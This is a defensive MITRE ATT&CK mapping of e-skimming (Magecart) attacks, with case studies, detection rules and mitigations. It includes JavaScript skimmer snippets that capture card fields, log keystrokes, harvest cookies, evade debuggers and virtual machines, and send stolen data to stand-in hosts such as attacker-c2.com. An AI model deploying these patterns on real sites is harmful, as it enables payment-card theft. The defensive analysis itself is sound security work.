# MITRE ATT&CK Matrix for E-Skimming Attacks

## Overview

This document presents a customized MITRE ATT&CK matrix specifically designed for e-skimming (web skimming, formjacking, Magecart) attacks. Based on extensive research and analysis of real-world e-skimming campaigns, this matrix maps attack techniques, tactics, and procedures (TTPs) used by threat actors to compromise e-commerce platforms and steal payment card data.

**Document Version**: 1.0
**Last Updated**: 2025-01-18
**Target Environment**: Web applications, e-commerce platforms, payment processing systems

---

## Attack Lifecycle Overview

```
Initial Access → Execution → Persistence → Defense Evasion →
Collection → Exfiltration → Impact
```

---

## MITRE ATT&CK Tactics and Techniques

### TA0001: Initial Access

The techniques used by attackers to gain initial entry into the target e-commerce infrastructure.

#### T1190: Exploit Public-Facing Application
**Description**: Exploitation of vulnerabilities in e-commerce platforms to gain access.

**E-Skimming Context**:
- **CVE-2024-34102 (CosmicSting)**: XXE vulnerability in Adobe Commerce/Magento 2.4.7
  - CVSS Score: 9.8/10
  - Remote code execution capability
  - Resulted in 3x increase in Magecart infections (11,000+ domains in 2024)
- **CMS Vulnerabilities**: WordPress, WooCommerce, Magento plugin exploits
- **Unpatched Systems**: Targeting outdated e-commerce platforms

**Real-World Examples**:
- CosmicSting exploitation leading to mass compromise
- Magento 1.x end-of-life exploitation
- WooCommerce plugin vulnerabilities

**Detection**:
- Web application firewall (WAF) logs showing exploit attempts
- Unusual HTTP requests to admin panels
- XXE entity expansion in XML parsers

---

#### T1078: Valid Accounts
**Description**: Use of stolen or compromised credentials to access e-commerce admin panels.

**E-Skimming Context**:
- **Stolen Admin Credentials**: Phishing, info-stealer malware, credential stuffing
- **Developer Account Compromise**: SSH/FTP credentials, code repository access
- **Lack of MFA**: Single-factor authentication enabling easy compromise

**Real-World Examples**:
- **British Airways (2018)**: Stolen admin credentials used to modify Modernizr library
- **TechGear Store**: Developer laptop infected with info-stealer malware
- **Newegg (2018)**: Direct server access via compromised credentials

**Attack Patterns**:
- Off-hours login from unusual locations
- VPN usage to mask attacker location
- Access to file systems via SSH/FTP with legitimate credentials

**Detection**:
- Unusual login times and locations
- Multiple failed login attempts
- Account access from anonymous VPN services
- Privileged actions outside normal deployment windows

---

#### T1195: Supply Chain Compromise
**Description**: Manipulation of third-party services, libraries, or dependencies to inject malicious code.

**E-Skimming Context**:
- **Third-Party Script Compromise**: CDN providers, analytics services, chat widgets
- **Extension/Plugin Hijacking**: Compromised browser extensions and CMS plugins
- **Library Modifications**: Tampering with JavaScript libraries (jQuery, Modernizr, etc.)

**Sub-Techniques**:

**T1195.001: Compromise Software Dependencies and Development Tools**
- npm package compromise
- JavaScript library tampering
- Build tool injection

**T1195.002: Compromise Software Supply Chain**
- **Ticketmaster (2018)**: Compromised Inbenta chatbot third-party service (40,000 victims)
- **Forbes (2019)**: Third-party compromise via fontsawesome.gq domain
- CDN provider compromise affecting multiple downstream sites

**Detection**:
- Subresource Integrity (SRI) hash mismatches
- Unexpected changes to third-party script content
- New script sources appearing in CSP violation reports
- File integrity monitoring alerts on vendor libraries

---

### TA0002: Execution

Techniques used to run malicious code on the victim's browser or server.

#### T1059.007: JavaScript
**Description**: Execution of malicious JavaScript in the victim's browser.

**E-Skimming Context**:
- **Client-Side Execution**: All e-skimming attacks execute JavaScript in the browser
- **Form Event Interception**: Event listeners on payment forms
- **DOM Manipulation**: Real-time field monitoring and data capture

**Attack Patterns**:
1. **Form Submission Interception** (Lab 01)
   - `addEventListener('submit', stealData)`
   - Intercept form POST before legitimate submission

2. **DOM-Based Monitoring** (Lab 02)
   - MutationObserver API for detecting payment forms
   - Input/change event listeners for real-time capture
   - Shadow DOM abuse for stealth operations

3. **Extension-Based Execution** (Lab 03)
   - Content scripts injected across all websites
   - Background service workers for persistence
   - Privileged extension APIs bypassing same-origin policy

**Code Patterns**:
```javascript
// Form interception
document.addEventListener('submit', function(e) {
    var cardData = extractPaymentData();
    exfiltrateToC2(cardData);
});

// Real-time monitoring
document.addEventListener('input', function(e) {
    if (isPaymentField(e.target)) {
        captureKeystroke(e.target.value);
    }
});

// MutationObserver for dynamic forms
new MutationObserver(callback).observe(document, {
    childList: true,
    subtree: true
});
```

**Detection**:
- Unexpected event listeners on payment forms
- Unauthorized script execution in checkout context
- Content Security Policy violations
- Browser extension behavioral anomalies

---

#### T1203: Exploitation for Client Execution
**Description**: Exploitation of browser or extension vulnerabilities to execute skimmer code.

**E-Skimming Context**:
- **Browser Extension Vulnerabilities**: Privilege escalation through extension permissions
- **Cross-Site Scripting (XSS)**: Injection points in payment forms
- **Prototype Pollution**: JavaScript object manipulation

**Detection**:
- Browser crash reports and exceptions
- XSS payload detection in input fields
- Unusual extension permission requests

---

### TA0003: Persistence

Techniques to maintain access and continue operations over extended periods.

#### T1176: Browser Extensions
**Description**: Use of malicious or compromised browser extensions for persistent access.

**E-Skimming Context**:
- **Extension Hijacking**: Compromise of legitimate extensions
- **Malicious Distribution**: Fake security or productivity extensions
- **Update Mechanism Abuse**: Pushing malicious updates to installed extensions

**Attack Characteristics**:
- **Persistent Across Sessions**: Remains active across browser restarts
- **Cross-Site Access**: Monitors all websites user visits
- **Privileged Permissions**: Bypasses same-origin policy and CSP

**Real-World Examples**:
- **DataSpii**: Browser extensions stealing personal data
- **Great Suspender**: Popular extension compromised for data theft
- **Crypto Wallet Extensions**: Targeted for cryptocurrency theft

**Detection**:
- Extensions with excessive permissions (`<all_urls>`, `webRequest`, etc.)
- Unexpected extension updates
- Network traffic from extension background scripts
- Permission escalation in extension updates

---

#### T1554: Compromise Client Software Binary
**Description**: Modification of legitimate JavaScript files to include skimmer code.

**E-Skimming Context**:
- **File Modification**: Appending skimmer to existing checkout.js
- **Library Tampering**: Injecting code into common libraries (jQuery, Modernizr)
- **Build Process Compromise**: Injecting during build/deployment

**Attack Patterns**:
- **British Airways Style**: 22 lines appended to Modernizr library
- **Newegg Pattern**: Modified payment page JavaScript
- **Blended Code**: Mixing malicious code with legitimate functions

**Persistence Duration**:
- Average: 47 days undetected
- British Airways: 15 days (380,000 victims)
- Typical range: 2 weeks to 6 months

**Detection**:
- File integrity monitoring (FIM) with hash verification
- Git diff alerts on production files
- Anomaly detection for file modifications outside deploy windows
- Code review of production JavaScript

---

### TA0005: Defense Evasion

Techniques to avoid detection by security tools and analysts.

#### T1027: Obfuscated Files or Information
**Description**: Code obfuscation to evade detection and analysis.

**E-Skimming Context**:
- **Base64 Encoding**: Simple encoding to hide strings
- **Multiple Encoding Layers**: Nested encoding (Base64, hex, custom)
- **Commercial Obfuscators**: obfuscator.io, JavaScript-obfuscator
- **Dead Code Injection**: Adding irrelevant code to confuse analysis

**Obfuscation Techniques**:

**T1027.001: Binary Padding**
- Dead code injection to inflate file size
- Dummy functions that are never called
- Commented-out code to appear legitimate

**T1027.005: Indicator Removal from Tools**
- String obfuscation to hide C2 domains
- Dynamic URL construction: `String.fromCharCode(104,116,116,112,115...)`
- Variable name mangling: `_0x1a2b3c`, `a`, `b`, `c`

**Example Obfuscation Patterns**:
```javascript
// Simple Base64
eval(atob('ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcig...'));

// Multi-layer encoding
eval(atob(String.fromCharCode(...hexArray)));

// Control flow flattening
var _0x1234 = ['\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72'];

// Obfuscator.io output
function _0x5a3b() {
    var _0x4e6c = ['addEventListener', 'submit', ...];
    return _0x4e6c;
}
```

**Commercial Obfuscation**:
- **Kritec Skimmer**: Multi-stage Base64 encoding + obfuscator.io
- **Gateway Skimmer**: Multiple obfuscation layers + debugger checks
- **WooTheme Variants**: Varied obfuscation complexity

**Detection**:
- High entropy in JavaScript code
- eval(), Function(), with encoded arguments
- Unusual variable naming patterns
- Multiple encoding/decoding operations
- Static analysis tools (Semgrep, ESLint rules)

---

#### T1622: Debugger Evasion
**Description**: Anti-debugging techniques to prevent security analysis.

**E-Skimming Context**:
- **Firebug/DevTools Detection**: Checking for open developer tools
- **Debugger Statement Traps**: Using debugger; to halt analysis
- **Timing Attacks**: Detecting execution time differences
- **Console Manipulation**: Overriding console methods

**Detection Techniques**:
```javascript
// Firebug detection (Gateway Skimmer)
if (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) {
    // Don't execute skimmer
}

// DevTools detection via timing
var start = performance.now();
debugger;
var end = performance.now();
if (end - start > 100) { /* DevTools open, exit */ }

// Console override
console.log = function() {};
console.warn = function() {};
```

**Detection**:
- Scripts checking for debugger APIs
- Performance timing measurements
- Window size/orientation checks (detecting DevTools panel)
- References to Firebug, DevTools, or debugging keywords

---

#### T1480: Execution Guardrails
**Description**: Conditional execution based on environment to evade detection.

**E-Skimming Context**:
- **Geofencing**: Execute only in specific countries
- **VPN Detection**: Avoid security researchers using VPNs
- **Environment Detection**: Browser, OS, device type filtering
- **VM Detection**: Avoiding sandbox environments

**Sub-Techniques**:

**T1480.001: Environmental Keying**

**Geofencing**:
- Serve malicious code only to specific countries
- Avoid US/EU due to strict regulations and active research
- Target regions with lower security awareness

**Device/Browser Fingerprinting**:
- **Browser Type**: Avoiding Internet Explorer, targeting Chrome/Safari
- **Device Type**: Preferring mobile devices
- **OS Detection**: Hiding from Linux users (likely researchers)
- **VM Detection**: WebGL API checks for "swiftshader", "llvmpipe", "virtualbox"

**Implementation Patterns**:
```javascript
// Geofencing
if (!isTargetCountry(getUserCountry())) {
    return; // Don't execute skimmer
}

// VPN detection
if (isVPN(ipAddress)) {
    return; // Likely researcher
}

// VM detection via WebGL
var canvas = document.createElement('canvas');
var gl = canvas.getContext('webgl');
var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
if (renderer.toLowerCase().includes('swiftshader') ||
    renderer.toLowerCase().includes('llvmpipe') ||
    renderer.toLowerCase().includes('virtualbox')) {
    return; // VM detected, don't execute
}

// Browser fingerprinting
if (navigator.userAgent.includes('Linux') ||
    navigator.userAgent.includes('MSIE')) {
    return;
}
```

**Detection**:
- Code performing environment checks before execution
- Geolocation API usage in unusual contexts
- WebGL renderer queries
- User-agent string parsing
- Conditional execution based on environment

---

#### T1036: Masquerading
**Description**: Disguising malicious code as legitimate services or libraries.

**E-Skimming Context**:
- **Google Tag Manager Disguise**: Scripts resembling GTM snippets
- **Analytics Lookalike Domains**: analytics-cdn.com, google-analytics.net
- **Legitimate-Looking Filenames**: analytics.js, tracking.js, stats.js
- **Error Page Hiding**: Code in 404/error pages

**Masquerading Techniques**:

**T1036.005: Match Legitimate Name or Location**
- **GTM Disguise**: Inline scripts looking like Google Tag Manager
- **Analytics Domains**: C2 servers with names like legitimate analytics
- **CDN Mimicry**: Domains appearing to be content delivery networks

**404 Page Manipulation**:
- Hiding skimmer code in default error pages
- Rarely inspected, ideal for persistent access
- Error handlers modified to execute skimmer

**Image Steganography**:
- JavaScript encoded in PHP within image EXIF data
- Favicon-based code storage
- Data hidden in JPEG/PNG files
- **Segway (2022)**: 600,000+ records via image-hidden code

**Implementation Examples**:
```javascript
// GTM-like appearance
(function(w,d,s,l,i){
    // Looks legitimate, actually steals data
    w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime()});
    // Malicious code here
})(window,document,'script','dataLayer','GTM-XXXX');

// Analytics-like domain
fetch('https://analytics-cdn.com/collect', {
    method: 'POST',
    body: JSON.stringify(cardData)
});
```

**Detection**:
- Domain reputation checks
- SSL certificate validation
- Script source validation against known good hashes
- Content inspection of error pages

---

### TA0009: Collection

Techniques to gather payment card data and personal information from victims.

#### T1056: Input Capture
**Description**: Capturing user input from payment forms.

**E-Skimming Context**:
- **Form Field Extraction**: Reading values from payment forms
- **Keystroke Logging**: Real-time capture as user types
- **Clipboard Monitoring**: Intercepting pasted payment data
- **Auto-fill Interception**: Capturing browser auto-fill data

**Sub-Techniques**:

**T1056.001: Keylogging**
```javascript
// Real-time keystroke capture
document.addEventListener('keyup', function(e) {
    if (isPaymentField(e.target)) {
        var keystroke = {
            field: e.target.name,
            value: e.target.value,
            timestamp: Date.now()
        };
        sendToC2(keystroke);
    }
});
```

**T1056.002: GUI Input Capture**
- **Form Submission Interception**: Submit event listeners
- **Change Event Monitoring**: Capturing on input/change events
- **Focus/Blur Tracking**: Monitoring field interactions

**Data Collected**:
- **Payment Card Data**: Card number, CVV, expiry date, cardholder name
- **Billing Information**: Address, ZIP code, phone number, email
- **Personal Information**: Name, email, phone, account credentials
- **Session Data**: Cookies, localStorage, sessionStorage
- **Device Fingerprint**: Browser type, OS, screen resolution, timezone

**Implementation Patterns**:
```javascript
// Form submission interception (Lab 01)
document.querySelector('form').addEventListener('submit', function(e) {
    var cardData = {
        number: document.querySelector('#card-number').value,
        cvv: document.querySelector('#cvv').value,
        expiry: document.querySelector('#expiry').value,
        name: document.querySelector('#cardholder-name').value,
        billing: {
            address: document.querySelector('#billing-address').value,
            zip: document.querySelector('#zip').value,
            email: document.querySelector('#email').value
        }
    };
    exfiltrate(cardData);
});

// Real-time input monitoring (Lab 02)
document.querySelectorAll('input').forEach(function(input) {
    input.addEventListener('input', function(e) {
        if (e.target.type === 'text' || e.target.type === 'password') {
            captureRealtime(e.target.name, e.target.value);
        }
    });
});

// Clipboard monitoring
document.addEventListener('paste', function(e) {
    var pastedData = (e.clipboardData || window.clipboardData).getData('text');
    if (isPaymentData(pastedData)) {
        exfiltrate({clipboard: pastedData});
    }
});
```

**Payment Field Detection**:
```javascript
// CSS selectors for payment fields
var selectors = [
    '[name*="card"]', '[id*="card"]', '[class*="card"]',
    '[name*="cvv"]', '[name*="cvc"]', '[name*="security"]',
    '[autocomplete="cc-number"]', '[autocomplete="cc-exp"]',
    '[autocomplete="cc-csc"]', '[type="password"]',
    '[data-payment]', '[class*="payment"]'
];

// Multi-form data collection using localStorage
localStorage.setItem('stolen_' + fieldName, fieldValue);
```

**Detection**:
- Unexpected event listeners on payment forms
- JavaScript accessing payment field values
- Input event handlers on sensitive fields
- Clipboard access in checkout context
- localStorage/sessionStorage writes with payment data

---

#### T1114: Email Collection
**Description**: Harvesting email addresses for phishing and fraud.

**E-Skimming Context**:
- Email fields captured alongside payment data
- Used for follow-up phishing attacks
- Sold on dark web marketplaces

---

#### T1005: Data from Local System
**Description**: Collection of data stored locally in browser.

**E-Skimming Context**:
- **LocalStorage/SessionStorage**: Cached payment data, user preferences
- **Browser Cookies**: Session tokens, authentication cookies
- **IndexedDB**: Payment methods saved by legitimate site
- **Extension Storage**: Data from password managers and payment extensions

**Implementation**:
```javascript
// LocalStorage scraping
for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    var value = localStorage.getItem(key);
    collectData(key, value);
}

// Cookie harvesting
var cookies = document.cookie.split(';');
cookies.forEach(function(cookie) {
    sendToC2(cookie);
});
```

**Detection**:
- Scripts enumerating localStorage/sessionStorage
- Bulk cookie access
- IndexedDB queries in unusual contexts

---

### TA0010: Exfiltration

Techniques to transmit stolen payment data to attacker-controlled infrastructure.

#### T1041: Exfiltration Over C2 Channel
**Description**: Sending stolen data to command and control servers.

**E-Skimming Context**:
- **HTTP POST Requests**: Most common exfiltration method
- **WebSocket Connections**: Real-time bidirectional communication
- **Beacon API**: Reliable data transmission on page unload
- **Image Requests**: Data encoded in URL parameters (GET)

**Exfiltration Methods**:

**1. HTTP POST (Most Common)**
```javascript
fetch('https://analytics-cdn.com/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(stolenData),
    mode: 'no-cors' // Avoid CORS errors, no response needed
});

// XMLHttpRequest alternative
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker-c2.com/log', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('data=' + encodeURIComponent(JSON.stringify(cardData)));
```

**2. WebSocket Exfiltration**
```javascript
// Real-time C2 channel
var ws = new WebSocket('wss://attacker-c2.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify(stolenData));
};

// Kritec Skimmer dual exfiltration
// Both WebSocket AND HTTP POST for redundancy
```

**3. Beacon API (Reliable on Page Unload)**
```javascript
navigator.sendBeacon('https://attacker-c2.com/beacon',
    JSON.stringify(stolenData));
```

**4. Image Request (GET-based)**
```javascript
// Data in URL parameters
var img = new Image();
img.src = 'https://attacker-c2.com/pixel.gif?data=' +
    encodeURIComponent(btoa(JSON.stringify(cardData)));
```

**C2 Domain Characteristics**:
- **Lookalike Domains**: google-analytics.net, analytics-cdn.com
- **Fast Flux**: Rapidly changing IP addresses
- **Bulletproof Hosting**: Resistant to takedown
- **Legitimate SSL**: Valid certificates to appear trustworthy

**Real-World Examples**:
- **British Airways**: baways.com (lookalike domain)
- **Forbes**: fontsawesome.gq (typosquatting fontawesome.com)
- **Multiple Campaigns**: analytics-cdn.com, cdn-google.com

**Detection**:
- Unexpected POST requests from checkout pages
- WebSocket connections to unusual domains
- Beacon API usage in payment context
- Image requests with large query parameters
- Requests to newly registered domains
- SSL certificate anomalies
- Network traffic to bulletproof hosting providers

---

#### T1030: Data Transfer Size Limits
**Description**: Breaking large data sets into chunks to avoid detection.

**E-Skimming Context**:
- Small payloads to blend with legitimate analytics
- Chunking data across multiple requests
- Rate limiting to avoid traffic spikes

---

#### T1048: Exfiltration Over Alternative Protocol
**Description**: Using uncommon protocols for data exfiltration.

**E-Skimming Context**:
- **DNS Tunneling**: Encoding data in DNS queries
- **WebRTC Data Channels**: Peer-to-peer exfiltration
- **Service Workers**: Background data transmission

---

### TA0040: Impact

The ultimate consequences of successful e-skimming attacks.

#### T1565: Data Manipulation
**Description**: Modification of data or transaction flows.

**E-Skimming Context**:
- **Form Overlay Attacks**: Replacing legitimate payment forms
- **Payment Redirection**: Changing payment destination
- **Dynamic Form Injection**: Creating fake payment forms

**Techniques**:
```javascript
// Form overlay (Lab 02)
var fakeForm = createMaliciousForm();
parentElement.insertBefore(fakeForm, realForm);
realForm.style.display = 'none';

// Payment redirection
document.querySelector('form').action = 'https://attacker-payment.com/process';
```

---

#### T1496: Resource Hijacking
**Description**: Using victim resources for attacker purposes.

**E-Skimming Context**:
- Browser resources for cryptocurrency mining (cryptojacking)
- Combined with skimming for dual monetization

---

#### T1491: Defacement
**Description**: Modifying website content (rare in e-skimming).

**E-Skimming Context**:
- Generally avoided to maintain stealth
- Occasional defacement after data collection complete

---

#### T1499: Endpoint Denial of Service
**Description**: Disrupting payment processing (uncommon).

**E-Skimming Context**:
- Rarely used as it attracts attention
- May occur as side effect of poorly coded skimmer

---

## E-Skimming Specific Tactics

### Attack Variants by Platform

#### Magecart (13+ Groups)
- **Duration**: Active since 2015
- **Victims**: 380,000 (British Airways), 40,000 (Ticketmaster)
- **Characteristics**: Multi-form data, localStorage scraping, supply chain focus

#### WooCommerce Skimmers (29% of e-commerce)
1. **WooTheme Skimmer**: Simple, easily understood, typically obfuscated
2. **Slect Skimmer**: Variation of Grelos, intentional misspellings
3. **Gateway Skimmer**: Multiple obfuscation layers, Firebug checks

#### Inter/SnifFall Skimmer Kit
- **Cost**: $5,000 (2016) → $1,300 + profit-sharing (2018)
- **Features**: Dashboard, automated duplicate detection, fake forms
- **Impact**: ~1,500 sites compromised

#### Kritec Skimmer
- Multi-stage Base64 encoding
- Heavy obfuscation (obfuscator.io)
- Dual exfiltration (WebSocket + POST)

---

## Detection and Mitigation Matrix

### Detection Techniques by Attack Stage

| Attack Stage | Detection Method | Tools | Indicators |
|-------------|------------------|-------|------------|
| **Initial Access** | Log monitoring, WAF | Splunk, ModSecurity | Unusual admin access, exploit attempts |
| **Execution** | CSP violations, script analysis | Browser DevTools, Semgrep | Unexpected scripts, CSP reports |
| **Persistence** | File integrity monitoring | OSSEC, Tripwire | File modifications, unauthorized changes |
| **Defense Evasion** | Static analysis, deobfuscation | de4js, js-beautify | High entropy, eval(), obfuscation |
| **Collection** | Runtime monitoring, event listener analysis | Custom scripts, browser extensions | Unexpected form access, input listeners |
| **Exfiltration** | Network monitoring, anomaly detection | Wireshark, Suricata | Unexpected POST requests, new domains |

---

## Defense Strategies

### Preventive Controls

#### 1. Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' https://trusted-cdn.com;
               connect-src 'self';
               report-uri /csp-report">
```

**Benefits**:
- Blocks unauthorized script sources
- Prevents inline script execution
- Reports violations for analysis

**Limitations**:
- Doesn't prevent modification of existing scripts
- Can be bypassed with script-src 'unsafe-inline'

---

#### 2. Subresource Integrity (SRI)
```html
<script src="https://cdn.example.com/library.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

**Benefits**:
- Detects unauthorized modifications to external scripts
- Prevents execution if hash doesn't match
- Protects against CDN compromise

---

#### 3. File Integrity Monitoring (FIM)
- **Tools**: OSSEC, Tripwire, AIDE
- **Coverage**: All production JavaScript, HTML, CSS files
- **Alerts**: Real-time notifications on unauthorized changes
- **Baseline**: Cryptographic hashes of known-good files

---

#### 4. Network Monitoring
- **Monitor**: All outbound traffic from checkout pages
- **Baseline**: Legitimate payment processor domains
- **Alert**: Requests to unknown/suspicious domains
- **Tools**: Suricata, Snort, Zeek

---

#### 5. Access Controls
- **Multi-Factor Authentication (MFA)**: Required for all admin accounts
- **Principle of Least Privilege**: Minimal necessary permissions
- **IP Allowlisting**: Restrict admin access to known IPs
- **Session Monitoring**: Detect unusual access patterns

---

### Detective Controls

#### 1. Behavioral Monitoring
```javascript
// Monitor for unauthorized form access
(function() {
    var originalGetter = Object.getOwnPropertyDescriptor(
        HTMLInputElement.prototype, 'value'
    ).get;

    Object.defineProperty(HTMLInputElement.prototype, 'value', {
        get: function() {
            if (isPaymentField(this) && !isAuthorized()) {
                alert('Unauthorized access to payment field!');
                console.trace();
            }
            return originalGetter.call(this);
        }
    });
})();
```

---

#### 2. Static Analysis
**Tools**: Semgrep, ESLint, JSHint

**Rules for E-Skimming Detection**:
```yaml
# Semgrep rule for form data exfiltration
rules:
  - id: form-data-exfiltration
    patterns:
      - pattern: |
          document.querySelector($FORM).addEventListener('submit', ...)
      - pattern-inside: |
          fetch($URL, {...})
    message: Potential form data exfiltration detected
    severity: ERROR
    languages: [javascript]
```

---

#### 3. Runtime Analysis
- **Browser Extension Monitoring**: Track extension behavior and permissions
- **Event Listener Auditing**: Inventory all event listeners on sensitive forms
- **Network Request Logging**: Log all fetch/XMLHttpRequest calls
- **Console Monitoring**: Detect console override attempts

---

### Response and Recovery

#### Incident Response Workflow

1. **Detection**: Alert triggered by monitoring system
2. **Containment**:
   - Isolate affected systems
   - Revoke compromised credentials
   - Block C2 domains at firewall
3. **Eradication**:
   - Remove malicious code
   - Restore from known-good backups
   - Patch vulnerabilities
4. **Recovery**:
   - Restore service with clean code
   - Implement enhanced monitoring
   - Verify integrity
5. **Lessons Learned**:
   - Root cause analysis
   - Update detection rules
   - Improve preventive controls

---

## Real-World Attack Case Studies

### Case Study 1: British Airways (August 2018)

**Tactics**: Initial Access → Execution → Persistence → Collection → Exfiltration

**Attack Chain**:
1. **Initial Access** [T1078]: Stolen admin credentials, no MFA
2. **Execution** [T1059.007]: Modified Modernizr JavaScript library
3. **Persistence** [T1554]: 22-line skimmer appended to legitimate code
4. **Defense Evasion** [T1027]: Minimal obfuscation, blended with legitimate code
5. **Collection** [T1056.002]: Form submission interception
6. **Exfiltration** [T1041]: HTTP POST to baways.com

**Impact**:
- **Victims**: 380,000 customers
- **Duration**: 15 days (Aug 21 - Sep 5, 2018)
- **Fine**: £20M ICO fine
- **Data Stolen**: Payment cards, CVV, billing information

**Detection Failure**:
- No file integrity monitoring
- No behavioral monitoring
- Manual code review after fraud reports

---

### Case Study 2: Ticketmaster (June 2018)

**Tactics**: Supply Chain Compromise → Execution → Collection → Exfiltration

**Attack Chain**:
1. **Initial Access** [T1195.002]: Compromised Inbenta chatbot third-party service
2. **Execution** [T1059.007]: Malicious code in chatbot script
3. **Collection** [T1056]: Customer payment data captured
4. **Exfiltration** [T1041]: Data sent to attacker C2

**Impact**:
- **Victims**: 40,000 customers
- **Fine**: £1.25M
- **Attack Vector**: Supply chain (third-party compromise)

**Key Lesson**: Third-party scripts require SRI and CSP controls

---

### Case Study 3: CosmicSting / CVE-2024-34102 (2024)

**Tactics**: Exploit Public-Facing Application → Execution → Persistence

**Attack Chain**:
1. **Initial Access** [T1190]: XXE vulnerability in Adobe Commerce/Magento 2.4.7
2. **Execution**: Remote code execution via XML entity expansion
3. **Persistence**: Skimmer installation across checkout pages
4. **Impact**: 3x increase in Magecart infections (11,000+ domains)

**Detection**:
- WAF rules for XXE attempts
- Unusual XML requests to admin endpoints
- File system changes post-exploitation

---

## Threat Intelligence

### Attacker Infrastructure

#### C2 Server Characteristics
- **Domain Age**: Often newly registered (< 30 days)
- **Hosting**: Bulletproof hosting providers
- **SSL Certificates**: Let's Encrypt for legitimacy
- **Fast Flux**: Rapidly changing IP addresses
- **Typosquatting**: Domains similar to legitimate services

#### Exfiltration Endpoints
- `/collect`, `/log`, `/track`, `/beacon`, `/pixel.gif`
- Base64-encoded endpoints
- Dynamic URL generation to evade static rules

---

### Threat Actor Groups

#### Magecart Groups (13+ identified)
- **Group 1**: Supply chain focus, advanced techniques
- **Group 2-5**: Direct compromise, varying sophistication
- **Group 6**: Specialized in Adobe Commerce/Magento
- **Group 12**: Inter/SnifFall skimmer kit operator

---

### Indicators of Compromise (IOCs)

#### Network Indicators
- Requests to newly registered domains from checkout pages
- POST requests with Base64-encoded payment data
- WebSocket connections to unusual endpoints
- Beacon API usage with large payloads

#### Host Indicators
- Unexpected modifications to JavaScript files
- New event listeners on payment forms
- Suspicious browser extensions with broad permissions
- localStorage/sessionStorage with payment field names

#### Code Indicators
- `eval(atob(...))` patterns
- High-entropy variable names
- Payment field selectors (querySelector('[name*="card"]'))
- Fetch/XMLHttpRequest to non-payment-processor domains

---

## Testing and Validation

### Red Team Scenarios

1. **Scenario 1: Credential Compromise**
   - Simulate stolen admin credentials
   - Attempt to modify JavaScript files
   - Test detection and response

2. **Scenario 2: Supply Chain Attack**
   - Compromise test CDN
   - Inject skimmer into third-party library
   - Validate SRI and CSP protections

3. **Scenario 3: Extension Hijacking**
   - Deploy malicious browser extension
   - Test cross-site monitoring capabilities
   - Validate extension security controls

---

### Blue Team Detection Exercises

1. **Static Analysis Challenge**
   - Provide obfuscated skimmer code
   - Task: Identify malicious patterns
   - Use Semgrep, manual analysis

2. **Network Traffic Analysis**
   - PCAP file with legitimate + malicious traffic
   - Task: Identify exfiltration attempts
   - Tools: Wireshark, Suricata

3. **Runtime Monitoring**
   - Live checkout page with skimmer
   - Task: Detect using browser DevTools
   - Identify event listeners and network requests

---

## Recommendations

### For E-Commerce Platforms

1. **Implement Defense in Depth**
   - CSP + SRI + FIM + Network Monitoring
   - No single control is sufficient

2. **Enforce MFA**
   - All admin accounts require multi-factor authentication
   - Prevent credential-based compromise

3. **Third-Party Risk Management**
   - Vendor security assessments
   - SRI for all external scripts
   - Regular audits of third-party code

4. **Continuous Monitoring**
   - Real-time FIM alerts
   - Network anomaly detection
   - Behavioral monitoring of checkout pages

5. **Incident Response Plan**
   - Documented procedures for skimming incidents
   - Regular tabletop exercises
   - Forensic readiness (logging, retention)

---

### For Security Teams

1. **Threat Hunting**
   - Regular code reviews of production JavaScript
   - Network traffic baselining
   - Event listener inventory on critical pages

2. **Detection Engineering**
   - Develop custom Semgrep rules
   - Create Suricata/Snort signatures
   - Build behavioral monitoring scripts

3. **Training and Awareness**
   - Developer training on secure coding
   - Security team training on e-skimming TTPs
   - Incident response drills

---

## Conclusion

E-skimming attacks represent a sophisticated and evolving threat to e-commerce platforms. This MITRE ATT&CK matrix provides a comprehensive framework for understanding, detecting, and defending against these attacks.

**Key Takeaways**:

1. **Multi-Stage Attacks**: E-skimming involves multiple tactics from initial access through exfiltration
2. **Defense in Depth Required**: No single control prevents all attacks
3. **Supply Chain Risk**: Third-party scripts are a major attack vector
4. **Detection Challenges**: Obfuscation and evasion techniques make detection difficult
5. **Continuous Improvement**: Threat landscape evolves, defenses must adapt

---

## References

### Research Papers
- "Formjacking attack: Are we safe?" - Journal of Financial Crime, 2020
- Palo Alto Networks Unit 42: Anatomy of Formjacking Attacks
- Recorded Future: Annual Payment Fraud Intelligence Report 2024

### Industry Reports
- Sansec: What is Magecart? (70,000+ compromised stores database)
- RiskIQ & Flashpoint: Inside Magecart (2018)
- Microsoft Security: Beneath the Surface - Web Skimming Evolution
- Akamai Security Research: Magecart Campaign Reports

### Detection Tools
- Santander Security Research: e-Skimming-Detection (Semgrep rules)
- RapidSpike: Magecart Attack Detection System

### MITRE ATT&CK Framework
- https://attack.mitre.org/
- Enterprise ATT&CK Matrix
- ATT&CK Navigator

---

## Appendix A: Quick Reference Tables

### Tactic-Technique Mapping

| MITRE Tactic | Primary Techniques | E-Skimming Context |
|-------------|-------------------|-------------------|
| Initial Access | T1190, T1078, T1195 | Exploit CVEs, stolen credentials, supply chain |
| Execution | T1059.007, T1203 | JavaScript execution, browser exploitation |
| Persistence | T1176, T1554 | Browser extensions, file modification |
| Defense Evasion | T1027, T1622, T1480, T1036 | Obfuscation, anti-debug, geofencing, masquerading |
| Collection | T1056, T1005 | Form data, keylogging, localStorage |
| Exfiltration | T1041, T1030, T1048 | HTTP POST, WebSocket, alternative protocols |
| Impact | T1565, T1496 | Data manipulation, resource hijacking |

---

### Detection Tools Matrix

| Tool Category | Tools | Use Case |
|--------------|-------|----------|
| Static Analysis | Semgrep, ESLint, JSHint | Code pattern detection |
| Network Monitoring | Suricata, Snort, Zeek | Traffic analysis, C2 detection |
